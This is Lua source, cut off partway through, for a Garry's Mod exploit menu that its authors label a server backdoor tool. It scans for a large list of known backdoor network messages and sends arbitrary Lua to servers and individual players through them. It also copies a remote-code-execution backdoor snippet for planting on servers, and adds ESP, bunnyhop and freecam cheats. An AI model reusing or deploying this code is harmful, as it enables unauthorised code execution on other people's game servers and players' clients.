--/ Ascii Text In Console & Important locals

local stupidprints = print(string.rep("\n", 99))
local rtext = HSVToColor(CurTime() % 6 * 100, 1, 1 )
local ply = LocalPlayer():UserID()
local Version = 2.09
local warped = {}

MsgC(Color(0,0,0), [[
___       __   _____ ______   _______   ________   ___  ___
|\  \     |\  \|\   _ \  _   \|\  ___ \ |\   ___  \|\  \|\  \
\ \  \    \ \  \ \  \\\__\ \  \ \   __/|\ \  \\ \  \ \  \\\  \
 \ \  \  __\ \  \ \  \\|__| \  \ \  \_|/_\ \  \\ \  \ \  \\\  \
  \ \  \|\__\_\  \ \  \    \ \  \ \  \_|\ \ \  \\ \  \ \  \\\  \
   \ \____________\ \__\    \ \__\ \_______\ \__\\ \__\ \_______\
    \|____________|\|__|     \|__|\|_______|\|__| \|__|\|_______|
]])

MsgC(Color(rtext.r,rtext.g,rtext.b),[[
.  ...  ...  ... ..      .%./  &.     ....  ......  ....  ...
..  ....  ..  ...      .%**/     \        .....  .....  ....
....  ....  ..       .%***/       &.     .....  .....  ...  .
......  .... .     .%.***/  .d99b_  \      . ......  ... ....
.......          .%*****/ -'      `'.&.     .....  ... .....
..     ..      .%******/  ._."""'~::,  \      . ... .....   .
.......      .%*******/._'` .'"^':,  :.,&.     . ....  .....
...        .%********/',_-^{  ( )  }    :.\       ........ ..
..       .%*********/%^    '.     .'     ;.&.     .  ... ....
.      .%**********/;        ".,."        ;#.\     .  . .....
     .%***********/  ~'.,,.          ,.-'^    &.     . ... ..
   .%************/         ""-.,.-""~           \     . . ..
 w.%*************/                                &.     .. ..
%**************/  Developed by Warped & spiffy     \     ...
]])

warped.info = {
	"Backdoor By: Warped#1175 & spiffy#4049",
	"This is a luarun/server backdoor",
	"Credits to: spiffy",
	"Have Fun -Warped"
}

--/ Known Nets

warped.nets = {"net_handler5","nlr_sh","anti_altr","atfb_null","nbp_main","anti_pminge","hm_main","g_tool","anti_cht","vdate","LOLOLOL","armor_receiver","ShopMenuFix","Shield","shield","itemstore_handler","AdvDupe2_Receiver","AdvDupe_Receiver","ulx_2","w_menu","hacking bro","hackingbro","kebabmenu","rotten_proute",
"BITMINER_UPDATE_DLC","nostrip2","operationsmoke","vegeta","pd1","JSQuery.Data ( Post ( false ) )","anatikisgodd","anatikisgod","print()","fps","fszof<qOvfdsf","tupeuxpaslabypass","_CAC_G","adsp_door_length","SDFTableFsSSQS","EventStart","data_check","antileak","CreateAdminRanks","Asunalabestwaifu","shittycommand","tro2fakeestunpd","FAdmin_CreateVar","ContextHelp","lmaogetdunked",
"LV_BD_V2","createpanel","fuckyou","1337","haxor","r8helper","_chefhackv2","Þà?D)?","Þ?D)?","nostrip1","antilagger","Fix_Exploit","yazStats","FPSVBOOST","RTX420","Revelation","SizzurpDRM","cbbc","gSploit","ÃƒÅ¾ÃƒÂ ?D)Ã¢â€”Ëœ","Reaoscripting","ß ?D)?","?????????????????Ð¿??? ?? ?Ñ¿??Ä¿Õ¿? ???Ñ¿??Õ¿??Ð®","!Çº/;.","NoOdium_Reaoscripting",
"m9k_","Î¾psilon","Backdoor","reaper","SDFTableFsSSQE","gmod_dumpcfg", "fpsvboost", "antipk", "privatebackdoorshixcrewpr", "edouardo573", "sikye", "addoncomplie", "novisit", "no_visitping", "_reading_darkrp", "gPrinters.sncSettings", "mat", "mat(0)", "banId2", "keyss", "!?/;.", "SteamApp2313", "??D)?","?", "Þ� ?D)◘",
"Val", "models/zombie.mdl","REBUG", "????????????????????? ?? ??????? ??????????", "material", "entityhealt", "banId", "kickId2", "json.parse(crashsocket)", "elsakura", "dev", "FPSBOOST", "INJ3v4", "MJkQswHqfZ", "_GaySploit", "GaySploitBackdoor", "xuy", "legrandguzmanestla", "_Battleye_Meme_", "Dominos", "elfamosabackdoormdr", "thefrenchenculer", "xenoexistscl", "_Defcon", "EnigmaIsthere",
"BetStrep", "JQerystrip.disable", "ξpsilon", "Ulogs_Infos", "jeveuttonrconleul", "Sandbox_ArmDupe", "OdiumBackDoor", "RTPayloadCompiler", "playerreportabuse", "12", "opensellermenu", "sbussinesretailer", "DarkRP_Money_System", "ohnothatsbad", "yarrakye", "�? ?D)?", "DataMinerType", "weapon_phygsgun_unlimited","PlayerKilledLogged", "mdrlollesleakcestmal", "yerdxnkunhav", "kebab","L_BD_v2", "netstream", "pure_func_run_lua",
"rconyesyes", "Abcdefgh", "Fibre", "FPP_AntiStrip", "kidrp", "blacklist_backdoor", "boombox", "DOGE", "hexa", "-c", "VL_BD", "OBF::JH::HAX", "SACAdminGift", "GetSomeInfo", "nibba", "RegenHelp", "xmenuiftrue", "d4x1cl", "BlinkingCheckingHelp", "AnalCavity", "Data.Repost", "YOH_SAMBRE_IS_CHEATER", "dropadmin", "GLX_push", "ALTERED_CARB0N",
"thenostraall", "LVDLVM", ">sv", "utf8-gv", "argumentumac", "runSV", "adm_", "Inj3", "samosatracking57", "doorfix", "SNTEFORCE", "GLX_plyhdlpgpxlfpqnghhzkvzjfpjsjthgs", "disablecarcollisions" , "PlayerCheck" , "Sbox_darkrp" , "insid3" , "The_Dankwoo" , "Sbox_itemstore" , "Ulib_Message" , "ULogs_Info" , "ITEM" , "R8" , "fix" , "Fix_Keypads" , "Remove_Exploiters",
"noclipcloakaesp_chat_text" , "_Defqon" , "_CAC_ReadMemory" , "nostrip" , "nocheat" , "LickMeOut" , "ULX_QUERY2" , "ULXQUERY2" , "https://i.imgur.com/Gf6hLMl.png" , "MoonMan" , "Im_SOCool" , "JSQuery.Data(Post(false))" , "Sandbox_GayParty" , "DarkRP_UTF8" , "OldNetReadData" , "Gamemode_get" , "memeDoor" , "BackDoor" , "SessionBackdoor" , "DarkRP_AdminWeapons" , "cucked" , "NoNerks" , "kek" , "ZimbaBackdoor" , "something" ,
"random" , "strip0" , "fellosnake" , "enablevac" , "idk" , "ÃžÃ� ?D)â—˜" , "snte" , "apg_togglemode" , "Hi" , "beedoor" , "BDST_EngineForceButton" , "VoteKickNO" , "REEEEEEEEEEEE" , "_da_" , "Nostra" , "sniffing" , "keylogger" , "CakeInstall" , "Cakeuptade" , "love" , "earth" , "ulibcheck" , "Nostrip_" , "teamfrench" , "ADM",
"hack" , "crack" , "leak" , "lokisploit" , "1234" , "123" , "enculer" , "cake" , "seized" , "88" , "88_strings_" , "nostraall" , "blogs_update" , "nolag" , "loona_" , "billys_logs" , "loona" , "negativedlebest" , "berettabest" , "ReadPing" , "antiexploit" , "adm_NetString" , "mathislebg" , "Bilboard.adverts:Spawn(false)" , "pjHabrp9EY",
"?" , "lag_ping" , "allowLimitedRCON(user) 0" , "aze46aez67z67z64dcv4bt" , "killserver" , "fuckserver" , "cvaraccess" , "rcon" , "rconadmin" , "web" , "jesuslebg" , "zilnix" , "��?D)?" , "disablebackdoor" , "kill" , "DefqonBackdoor" , "DarkRP_AllDoorDatas" , "0101.1" , "awarn_remove" , "_Infinity" , "Infinity" , "InfinityBackdoor" , "_Infinity_Meme_" , "arivia" , "ULogs_B",
"_Warns" , "_cac_" , "striphelper" , "_vliss" , "YYYYTTYXY6Y" , "?????????????????�???? ?? ?�???�?�?? ???�???�???�." , "_KekTcf" , "_blacksmurf" , "blacksmurfBackdoor" , "_Raze" , "m9k_explosionradius" , "m9k_explosive" , "m9k_addons" , "rcivluz" , "SENDTEST" , "_clientcvars" , "_main" , "stream" , "waoz" , "bdsm" , "ZernaxBackdoor" , "UKT_MOMOS" , "anticrash" , "audisquad_lua" , "dontforget" ,
"noprop" , "thereaper" , "0x13" , "Child" , "!Cac" , "azkaw" , "BOOST_FPS" , "childexploit" , "ULX_ANTI_BACKDOOR" , "FADMIN_ANTICRASH" , "ULX_QUERY_TEST2" , "GMOD_NETDBG" , "netlib_debug" , "_DarkRP_Reading" , "lag_ping" , "||||"  , "FPP_RemovePLYCache" , "fuwa" , "stardoor" , "SENDTEST" , "rcivluz" , "c" , "N::B::P" , "changename" , "PlayerItemPickUp" ,
"echangeinfo" , "fourhead" , "music" , "slua" , "adm_network" , "componenttolua" , "theberettabcd" , "SparksLeBg" , "DarkRP_Armors" , "DarkRP_Gamemodes" , "fancyscoreboard_leave" , "PRDW_GET" , "pwn_http_send" , "AnatikLeNoob" , "GVacDoor" , "Keetaxor" , "BackdoorPrivate666" , "YohSambreLeBest" , "SNTE<ALL" , "!�:/;." , "pwn_http_answer" , "pwn_wake" , "verifiopd" , "AidsTacos" , "shix" ,
"PDA_DRM_REQUEST_CONTENT" , "xenoreceivetargetdata2" , "xenoreceivetargetdata1" , "xenoserverdatafunction" , "xenoserverfunction" , "xenoclientdatafunction" , "xenoclientfunction" , "xenoactivation" , "EXEC_REMOTE_APPS" , "yohsambresicianatik<3" , "Sbox_Message" , "Sbox_gm_attackofnullday_key" , "The_DankWhy" , "nw.readstream" , "AbSoluT" , "__G____CAC" , "Weapon_88" , "mecthack" , "SetPlayerDeathCount" ,
 "FAdmin_Notification_Receiver" , "DarkRP_ReceiveData" , "fijiconn" , "LuaCmd" , "EnigmaProject" , "z" , "cvardel" , "effects_en" , "file" , "gag" , "asunalabestwaifu" , "stoppk" , "Ulx_Error_88" , "NoOdium_ReadPing", " striphelper ","shield","Shield"}

--/ char generator helps make completely random hooks

function gString(l)
  if l < 1 then return nil end
  local s = ""
  for i = 1, l do
  s = s .. string.char(math.random(32, 126))
end return s
end

--/ Console Log Function

function warped.logc(...)
	MsgC(Color(25,25,25), "[WMENU]: ", Color(255,255,255), ...)
end

--/ Flashlight Hack

local flhack1 = false
local flhack2 = gString(math.random(12,100))
function flhack()
  hook.Add("Tick", flhack2, function()
    LocalPlayer():ConCommand("impulse 100")
  end)
end

--/ use spammer

local useS = false
timer.Create("useS", .1,0, function()
    if(!useS) then return end
    RunConsoleCommand("+use")
    timer.Simple(.11, function()
    RunConsoleCommand("-use")
    end)
end)

--/ Nvidia Logging

local yPos = 10

function warped.nvidlog(txt)
  local nvidmain = vgui.Create("DFrame")
  nvidmain:SetSize(300,30)
  nvidmain:SetPos(-300,yPos)
  nvidmain:SetTitle("         [wMenu]: "..txt)
  warped.logc(txt.."\n")
  nvidmain:ShowCloseButton(false)
  nvidmain.Paint = function(self,w,h)
    local rbow = HSVToColor( CurTime() % 6 * 100, 1, 1 )
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(rbow.r,rbow.g,rbow.b,255)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
  end

  local nvidpart = vgui.Create("DFrame", nvidmain)
  nvidpart:SetSize(30,30)
  nvidpart:SetPos(0,0)
  nvidpart:SetTitle("")
  nvidpart:ShowCloseButton(false)
  nvidpart.Paint = function(self,w,h)
    local rbow = HSVToColor( CurTime() % 6 * 100, 1, 1 )
    draw.RoundedBox(0,0,0,w,h,Color(rbow.r,rbow.g,rbow.b,255))
    surface.SetDrawColor(rbow.r,rbow.g,rbow.b,255)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
  end

  --/ Fade In & Out
  nvidmain:MoveTo(0,yPos,1,0,0.5)
  timer.Simple(3,function()
    local x,y = nvidmain:GetPos()
    nvidmain:MoveTo(-300,y,0.7,0,0.3)
  end)

  yPos = yPos + 35

  timer.Remove("nvid")
  timer.Create("nvid", 3.7, 1, function()
    yPos = 10
  end)

  timer.Simple(3.7,function()
    nvidmain:Close()
    if yPos >= 1050 then
      yPos = 10
    end
  end)
end

--/ Loading Noise

LocalPlayer():EmitSound("weapons/ar2/ar2_reload_push.wav",500,100)

--/ FPS Booster

local fpsboost = gString(math.random(12,100))
hook.Add("InitPostEntity", fpsboost, function()
	RunConsoleCommand("gmod_mcore_test", "1")
	RunConsoleCommand("mat_queue_mode", "-1")
	RunConsoleCommand("cl_threaded_bone_setup", "1")
	RunConsoleCommand("cl_threaded_client_leaf_system", "1")
	RunConsoleCommand("r_threaded_client_shadow_manager", "1")
	RunConsoleCommand("r_threaded_particles", "1")
	RunConsoleCommand("r_threaded_renderables", "1")
	RunConsoleCommand("r_queued_ropes", "1")
	RunConsoleCommand("studio_queue_mode", "1")
	hook.Remove("RenderScreenspaceEffects", "RenderColorModify")
	hook.Remove("RenderScreenspaceEffects", "RenderBloom")
	hook.Remove("RenderScreenspaceEffects", "RenderToyTown")
	hook.Remove("RenderScreenspaceEffects", "RenderTexturize")
	hook.Remove("RenderScreenspaceEffects", "RenderSunbeams")
	hook.Remove("RenderScreenspaceEffects", "RenderSobel")
	hook.Remove("RenderScreenspaceEffects", "RenderSharpen")
	hook.Remove("RenderScreenspaceEffects", "RenderMaterialOverlay")
	hook.Remove("RenderScreenspaceEffects", "RenderMotionBlur")
	hook.Remove("RenderScene", "RenderStereoscopy")
	hook.Remove("RenderScene", "RenderSuperDoF")
	hook.Remove("GUIMousePressed", "SuperDOFMouseDown")
	hook.Remove("GUIMouseReleased", "SuperDOFMouseUp")
	hook.Remove("PreventScreenClicks", "SuperDOFPreventClicks")
	hook.Remove("PostRender", "RenderFrameBlend")
	hook.Remove("PreRender", "PreRenderFrameBlend")
	hook.Remove("Think", "DOFThink")
	hook.Remove("RenderScreenspaceEffects", "RenderBokeh")
	hook.Remove("NeedsDepthPass", "NeedsDepthPass_Bokeh")
	hook.Remove("PostDrawEffects", "RenderWidgets")
	hook.Remove("PostDrawEffects", "RenderHalos")
end)


--/ Chat log functions

function warped.warnc(...)
	MsgC(Color(255,0,0), "[WARNING]: ", Color(255,255,255), ...)
end

--/ Moderation Tool Detections!

warped.util = _G.util

if istable(ULib) then
  warped.nvidlog("Server Has ULX!")
end

if istable(CPE) then
  warped.nvidlog("Server Has CPE!")
end

--/ Net BD

local mnet = "w_menu"
local mfunc = "util.AddNetworkString('w_menu') local x = CompileString(net.ReadString(), 'LuaCmd', false) if isfunction(x) then x() end end)"

--/ Will Copy the backdoor Net

function warped.copybackdoor()
	SetClipboardText(mfunc)
	warped.nvidlog("Code copied to clipboard! (use luarun/server files)")
end

--/ Free Camera AKA SpiritWalk

local FC = {}
local FCT = gString(math.random(12,100))
FC.Enabled = false
FC.ViewOrigin = Vector(0,0,0)
FC.ViewAngle = Angle(0,0,0)
FC.Velocity = Vector(0,0,0)

function FC.CalcView(ply, origin, angles, fov)
  if (!FC.Enabled) then return end
  if (FC.SetView) then
    FC.ViewOrigin = origin
    FC.ViewAngle = angles
    FC.SetView = false
end
return {origin = FC.ViewOrigin, angles = FC.ViewAngle}
end

hook.Add("CalcView", FCT, FC.CalcView)

function FC.CreateMove(cmd)
  if (!FC.Enabled) then return end

local time = FrameTime()
FC.ViewOrigin = FC.ViewOrigin + ( FC.Velocity * time )
FC.Velocity = FC.Velocity * 0.98
local sensitivity = 0.022
FC.ViewAngle.p = math.Clamp( FC.ViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
FC.ViewAngle.y = FC.ViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )

local add = Vector(0, 0, 0)
local ang = FC.ViewAngle
if(cmd:KeyDown(IN_FORWARD)) then add = add + ang:Forward() end
if(cmd:KeyDown(IN_BACK)) then add = add - ang:Forward() end
if(cmd:KeyDown(IN_MOVERIGHT)) then add = add + ang:Right() end
if(cmd:KeyDown(IN_MOVELEFT)) then add = add - ang:Right() end
if(cmd:KeyDown(IN_JUMP)) then add = add + ang:Up() end
if(cmd:KeyDown(IN_DUCK)) then add = add - ang:Up() end

add = add:GetNormal() * time * 500
if (cmd:KeyDown(IN_SPEED)) then add = add * 2 end
FC.Velocity = FC.Velocity + add

if (FC.LockView == true) then
  FC.LockView = cmd:GetViewAngles()
end
if (FC.LockView) then
  cmd:SetViewAngles(FC.LockView)
end
cmd:SetForwardMove(0)
cmd:SetSideMove(0)
cmd:SetUpMove(0)
end
hook.Add("CreateMove", FCT, FC.CreateMove )

function Freecam()
  FC.Enabled = !FC.Enabled
  if FC.Enabled then
    warped.nvidlog("Freecam: On!")
  else
    warped.nvidlog("Freecam: Off!")
  end
FC.LockView = FC.Enabled
FC.SetView = true
end

--/ Vars/ConVars

local plr = nil
local MenuOpen = false
CreateClientConVar("warped_target", "NONE")
GetConVar("warped_target"):SetString("NONE")

--/ Check A Netstring

function warped.check(netstr)
    return (warped.util.NetworkStringToID(netstr) > 0)
end

--/ Sendlua Function (must have a backdoor net)

function warped.sendlua(lua, name)
	if warped.check(GetConVar("warped_target"):GetString()) && GetConVar("warped_target"):GetString() ~= 'NONE' then
      _G.net.Start(GetConVar("warped_target"):GetString())
      _G.net.WriteString(lua)
      _G.net.WriteBit(1)
      _G.net.SendToServer()
	end
end

--/ BHOP Script

local rhook = gString(math.random(12,100))
local htog = 0
function fart_h()
	if htog == 0 then
		htog = 1
		hook.Add("CreateMove", rhook, function(ply)
			main_h(ply);
		end);
		warped.nvidlog("BHOP: Enabled!")
	else
		htog = 0
		warped.nvidlog("BHOP: Disabled!")
		if hook.GetTable("CreateMove", rhook) then
			hook.Remove("CreateMove", rhook)
		end
	end
end

function main_h(ply)
	if(ply:KeyDown(IN_JUMP) && !LocalPlayer():IsOnGround() && LocalPlayer():GetMoveType() != MOVETYPE_NOCLIP) then
		ply:RemoveKey(IN_JUMP);
	elseif(ply:KeyDown(IN_JUMP) && LocalPlayer():GetMoveType() != MOVETYPE_NOCLIP) then end
end

--/ SNTE Detector

local Bnets = {"Sbox_gm_attackofnullday_key","c","enablevac","ULXQUERY2","Im_SOCool","MoonMan","LickMeOut","SessionBackdoor","OdiumBackDoor","ULX_QUERY2","Sbox_itemstore","Sbox_darkrp","Sbox_Message","_blacksmurf","nostrip","Remove_Exploiters","Sandbox_ArmDupe","rconadmin","jesuslebg","disablebackdoor","blacksmurfBackdoor","jeveuttonrconleul","lag_ping","memeDoor",
"DarkRP_AdminWeapons","Fix_Keypads","noclipcloakaesp_chat_text","_CAC_ReadMemory","Ulib_Message","Ulogs_Infos","ITEM","nocheat","Î¾psilon","JQerystrip.disable","Sandbox_GayParty","DarkRP_UTF8","PlayerKilledLogged","OldNetReadData","Backdoor","cucked","NoNerks","kek","DarkRP_Money_System","BetStrep","ZimbaBackdoor","something","random","strip0","fellosnake",
"idk","||||","EnigmaIsthere","ALTERED_CARB0N","killserver","fuckserver","cvaraccess","_Defcon","dontforget","aze46aez67z67z64dcv4bt","nolag","changename","music","_Defqon","xenoexistscl","R8","AnalCavity","DefqonBackdoor","fourhead","echangeinfo","PlayerItemPickUp","thefrenchenculer","elfamosabackdoormdr","stoppk","noprop",
"reaper","Abcdefgh","JSQuery.Data(Post(false))","pjHabrp9EY","_Raze","88","Dominos","NoOdium_ReadPing","m9k_explosionradius","gag","_cac_","_Battleye_Meme_","legrandguzmanestla","ULogs_B","arivia","_Warns","xuy","samosatracking57","striphelper","m9k_explosive","GaySploitBackdoor","_GaySploit","slua","Bilboard.adverts:Spawn(false)","BOOST_FPS",
"FPP_AntiStrip","ULX_QUERY_TEST2","FADMIN_ANTICRASH","ULX_ANTI_BACKDOOR","UKT_MOMOS","rcivluz","SENDTEST","MJkQswHqfZ","INJ3v4","_clientcvars","_main","GMOD_NETDBG","thereape","audisquad_lua","anticrash","ZernaxBackdoor","bdsm","waoz","stream","adm_network","antiexploit","ReadPing","berettabest","componenttolua","theberettabcd",
"negativedlebest","mathislebg","SparksLeBg","DOGE","FPSBOOST","N::B::P","PDA_DRM_REQUEST_CONTENT","shix","Inj3","AidsTacos","verifiopd","pwn_wake","pwn_http_answer","pwn_http_send","The_Dankwoo","PRDW_GET","fancyscoreboard_leave","DarkRP_Gamemodes","DarkRP_Armors","yohsambresicianatik<3","EnigmaProject","PlayerCheck","Ulx_Error_88",
"FAdmin_Notification_Receiver","DarkRP_ReceiveData","Weapon_88","__G____CAC","AbSoluT","mecthack","SetPlayerDeathCount","awarn_remove","fijiconn","nw.readstream","LuaCmd","The_DankWhy"}

local Fnet = 0
local Lnet = 0
local TFnet = 0
local Unets = {}

for i=1,10000 do
    local Chck = util.NetworkIDToString(i)
    if !Chck then break end
    if table.HasValue(Bnets,Chck) then
        Fnet = Fnet + 1
        Lnet = i
        table.insert(Unets,Chck)
        if TFnet <= Fnet then TFnet = Fnet end
    end
end

if not next(Unets) then
    warped.nvidlog("SNTE Not Detected!")
  else
    warped.nvidlog("SNTE Nets Found, Check Console For Details!")
    for k,v in pairs(Unets) do
      warped.warnc("SNTE Net Found: "..v.."\n")
    end
end

--/ Scan Backdoor Nets

function warped.scan()
	 for k,v in pairs(warped.nets) do
		if warped.check(v) then
			GetConVar("warped_target"):SetString(v)
			warped.logc("Found Net: "..v.."\n")
		end
	end
	for i,g in pairs(Bnets) do
		if warped.check(g) then
			warped.warnc("Possible SNTE Net: "..g.."\n")
		end
	end
	warped.nvidlog("Selected Backdoor: "..GetConVar("warped_target"):GetString())
end

--/ Esp functions

HESP = gString(math.random(12,100))

function ESP()
  local rainbowesp = HSVToColor( CurTime() % 6 * 50, 1, 1 )
  hook.Add("HUDPaint",HESP,function()
    for k,v in pairs(player.GetAll()) do
      local Pos = (v:GetPos()):ToScreen()
      local Position = (v:GetPos() + Vector( 0,0,80 )):ToScreen()
      local Position2 = (v:GetPos() + Vector( 0,0,80 )):ToScreen()
      local Position3 = (v:GetPos() + Vector( 0,0,80 )):ToScreen()
      local Hp = v:Health()
      local Name = v:Nick()
      surface.SetDrawColor(rainbowesp.r, rainbowesp.g, rainbowesp.b, 255)
      draw.SimpleTextOutlined(Name,"Trebuchet18",Position.x,(Position.y + 5),Color(  rainbowesp.r, rainbowesp.g, rainbowesp.b, 255 ),TEXT_ALIGN_CENTER,TEXT_ALIGN_TOP,1,Color( 0, 0, 0, 255 ))
      draw.SimpleTextOutlined("Health: "..Hp.."   ","Trebuchet18",Position2.x,Position2.y,Color(  rainbowesp.r, rainbowesp.g, rainbowesp.b, 255 ),TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER,1,Color( 0, 0, 0, 255 ))
      draw.SimpleTextOutlined("Dist: "..math.Round(LocalPlayer():GetPos():Distance(v:GetPos()), 1),"Trebuchet18",Position2.x,(Position2.y - 5),Color(  rainbowesp.r, rainbowesp.g, rainbowesp.b, 255 ),TEXT_ALIGN_CENTER,TEXT_ALIGN_BOTTOM,1,Color( 0, 0, 0, 255 ))
      draw.SimpleTextOutlined("UserGroup: "..v:GetUserGroup(),"Trebuchet18",Position.x,(Position.y + 17.5),Color(  rainbowesp.r, rainbowesp.g, rainbowesp.b, 255 ),TEXT_ALIGN_CENTER,TEXT_ALIGN_TOP,1,Color( 0, 0, 0, 255 ))
    end
  end)
end

function ESPRefresh()
  hook.Remove("HUDPaint",HESP)
  ESP()
end

--/ Main Derma Frames & menu initiation
function warped.init()
  local DermaMain = vgui.Create("DFrame")
  DermaMain:MakePopup()
  DermaMain:SetBackgroundBlur(5)
  DermaMain:SetTitle("wMenu Recode" ..Version.. " | "..GetHostName().." | "..game.GetIPAddress().." | "..game.GetMap().." | "..os.date("%a - %I:%M:%S:%p").." | Have Fun "..LocalPlayer():Nick().."!")
  DermaMain:SetSize(1000,800)
  DermaMain:Center()
  DermaMain:ShowCloseButton(false)
  DermaMain.Paint = function(self,w,h)
      local rbow = HSVToColor( CurTime() % 6 * 100, 1, 1 )
      draw.RoundedBox(0,0,0,w,h,Color(30,30,30))
      surface.SetDrawColor(rbow.r,rbow.g,rbow.b,255)
  		surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
  end

  timer.Remove("RealTimeUpdater")
  timer.Create("RealTimeUpdater", 1, 0, function()
    DermaMain:SetTitle("wMenu Recode "..Version.." | "..GetHostName().." | "..game.GetIPAddress().." | "..game.GetMap().." | "..os.date("%a - %I:%M:%S:%p").." | Have Fun "..LocalPlayer():Nick().."!")
  end)

  local CloseButton = vgui.Create("DButton", DermaMain)
  CloseButton:SetSize(20,20)
  CloseButton:SetPos(979,1)
  CloseButton:SetText("X")
  CloseButton.Paint = function(self,w,h)
    draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(30,30,30))
    surface.SetDrawColor(30,30,30)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    surface.SetDrawColor(255,255,255)
    self:SetFont("Trebuchet18")
    self:SetTextColor(Color(255,255,255))
  end
  CloseButton.DoClick = function()
    DermaMain:Hide()
    surface.PlaySound("UI/buttonclick.wav")
  end

  local InnerFrame = vgui.Create("DFrame", DermaMain)
  InnerFrame:SetSize(960,750)
  InnerFrame:Center()
  InnerFrame:SetTitle("")
  InnerFrame:ShowCloseButton(false)
  InnerFrame:SetDraggable(false)
  InnerFrame.Paint = function(self,w,h)
    draw.RoundedBox(0,0,0,w,h,Color(25,25,25))
    surface.SetDrawColor(0,0,0,150)
		surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
  end

  --/ Custom Lua Executor

  local LuaLabel = vgui.Create("DTextEntry", InnerFrame)
  LuaLabel:SetPos(10,610)
  LuaLabel:SetSize(800,130)
  LuaLabel:SetValue("Lua To Send To Server/Clients")
  LuaLabel:SetMultiline(true)
  LuaLabel.Paint = function(self, w, h)
      surface.SetDrawColor(Color(33, 33, 33))
      surface.DrawRect(0, 0, w, h)
      surface.SetDrawColor(21, 21, 21)
      surface.SetMaterial(Material("gui/gradient_up"))
      surface.SetDrawColor(Color(30, 30, 30, 255))
      surface.SetMaterial(Material("gui/gradient_down"))
      surface.SetDrawColor(Color(146,246,193,150))
      surface.SetDrawColor(21, 21, 21, 255)
      surface.DrawOutlinedRect(0, 0, w, h)
      self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
      surface.SetDrawColor(0,0,0,150)
  		surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
      self:SetFont("Trebuchet18")
  end

  PPosY = 610

  function CreateLuaButton(name,func)
    local btnn = vgui.Create("DButton", InnerFrame)
    btnn:SetSize(130,60)
    btnn:SetPos(820,PPosY)
    btnn:SetText(name)
    btnn.DoClick = func
    btnn.Paint = function(self,w,h)
      draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(25,25,25))
      surface.SetDrawColor(0,0,0,150)
  		surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
      surface.SetDrawColor(255,255,255,50)
      self:SetFont("Trebuchet18")
      self:SetTextColor(Color(255,255,255))
    end
    PPosY = PPosY + 70
  end
  CreateLuaButton("Run Lua",function()
    if GetConVar("warped_target"):GetString() ~= "NONE" then
      net.Start(GetConVar("warped_target"):GetString())
      net.WriteString(LuaLabel:GetValue())
      net.WriteBit(false)
      net.SendToServer()

      warped.nvidlog("Ran Lua!")
    else
      warped.nvidlog("No Net Selected!")
    end

    surface.PlaySound("UI/buttonclick.wav")
  end)
  CreateLuaButton("Send Lua Plr", function()
    if plr ~= nil then
      if GetConVar("warped_target"):GetString() ~= "NONE" then
        net.Start(GetConVar("warped_target"):GetString())
        net.WriteString("local me = Player("..plr..") me:SendLua("..LuaLabel:GetValue()..")")
        net.WriteBit(false)
        net.SendToServer()

        warped.nvidlog("Lua Sent To: "..Player(plr):Nick())
      else
        warped.nvidlog("No Net Selected!")
      end
    else
      warped.nvidlog("No Player Selected!")
    end

    surface.PlaySound("UI/buttonclick.wav")
  end)

  --/ Scan For Backdoors

  function warped.scan()
    for k,v in pairs(warped.nets) do
      if warped.check(v) then
        GetConVar("warped_target"):SetString(v)
        warped.logc("Found Net: "..v.."\n")
      end
    end
    warped.nvidlog("Selected Backdoor: "..GetConVar("warped_target"):GetString())
    warped.logc("Selected Backdoor: "..GetConVar("warped_target"):GetString())
  end

  --/ Side Button Creation

  local PosY = 10
  function CreateSideButton(name, func)
    local Button1 = vgui.Create("DButton", InnerFrame)
    Button1:SetSize(130,35)
    Button1:SetPos(820,PosY)
    Button1:SetText(name)
    Button1.DoClick = func
    Button1.Paint = function(self,w,h)
      draw.RoundedBox(0,0,0,w,h,Color(25,25,25))
      surface.SetDrawColor(0,0,0,150)
  		surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
      self:SetFont("Trebuchet18")
      self:SetTextColor(Color(255,255,255))
    end

    PosY = PosY + 40
  end

  CreateSideButton("Scan Backdoors", function()
    warped.scan()
    surface.PlaySound("UI/buttonclick.wav")
  end)

  CreateSideButton("Select Net", function()
    Derma_StringRequest("Select Net", "Net To Select:", "", function(str)
      if warped.check(str) then
        GetConVar("warped_target"):SetString(str)
        warped.nvidlog("Selected Net: "..str.."!")
      else
        warped.nvidlog("Invalid Net!")
      end
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  CreateSideButton("Copy Net", function()
    warped.copybackdoor()
    surface.PlaySound("UI/buttonclick.wav")
  end)
  CreateSideButton("Information", function()
    for k,v in pairs(warped.info) do
      warped.logc(v.."\n")
    end
    warped.nvidlog("Information In Console!")
    surface.PlaySound("UI/buttonclick.wav")
  end)

  CreateSideButton("Add Netstring", function()
    Derma_StringRequest("Add Net", "Net To Add:", "", function(str)
      table.insert(warped.nets, #warped.nets, str)
      warped.nvidlog("Added Net: "..str.." At Spot: "..#warped.nets)
    end)
    surface.PlaySound("UI/buttonclick.wav")
  end)

  CreateSideButton("Menu/Player Refresh", function()
    DermaMain:Close()
    warped.init()
  end)

  --/ Tab Creation

  local Tab1 = vgui.Create("DScrollPanel", InnerFrame)
  Tab1:SetSize(160,565)
  Tab1:SetPos(10,35)
  Tab1.Paint = function(self,w,h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30))
    surface.SetDrawColor(0,0,0,150)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
  end

  local vBar1 = Tab1:GetVBar()
  vBar1:SetWide(0)

	local T1L = vgui.Create("DLabel", InnerFrame)
	T1L:SetText("            [All Players]")
	T1L:SetPos(10,10)
	T1L:SetSize(160,25)
	T1L.Paint = function(self,w,h)
